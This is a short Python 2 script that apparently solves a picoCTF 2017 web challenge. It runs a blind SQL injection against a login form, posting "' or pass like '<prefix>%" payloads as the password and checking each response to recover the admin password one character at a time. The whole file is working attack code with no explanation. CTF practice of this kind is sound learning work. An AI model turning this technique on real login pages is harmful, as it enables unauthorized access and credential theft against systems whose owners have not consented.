import requests
import string

url = "http://shell2017.picoctf.com:35428/"
user = "admin"
charset = string.lowercase + string.uppercase + string.digits + "_"
# make sure underscore is last char we check

flag = ""

for i in xrange(63):
	for c in charset:
		flag += c
		payload = "' or pass like '" + flag + "%"
		r = requests.post(url, data={"username": user, "password": payload})

		if r.text.find("Incorrect Password") != -1:
			flag = flag[:-1]
		else:
			print "flag: ", flag
			break
